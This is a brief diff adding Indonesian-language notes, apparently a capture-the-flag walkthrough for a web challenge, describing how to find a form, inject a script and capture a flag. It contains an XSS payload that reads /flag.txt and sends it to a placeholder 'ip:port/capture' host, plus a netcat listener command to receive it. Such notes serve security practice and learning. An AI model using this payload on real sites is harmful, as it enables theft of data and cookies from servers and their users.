@@ -1,0 +1,7 @@
+1. explore web -> jangan lgsg di /flag
+2. dapet form page disitu -> inject payload -> <script>
+  fetch('/flag.txt').then(res => res.text()).then(data => fetch('ip:port/capture?flag=' + encodeURIComponent(data)));
+</script>
+3. nyalain  nc dulu baru inject -> nc -nvlp port 
+4. inject
+5. dapet response coba decode dari urlencoded biar ga persen persenan
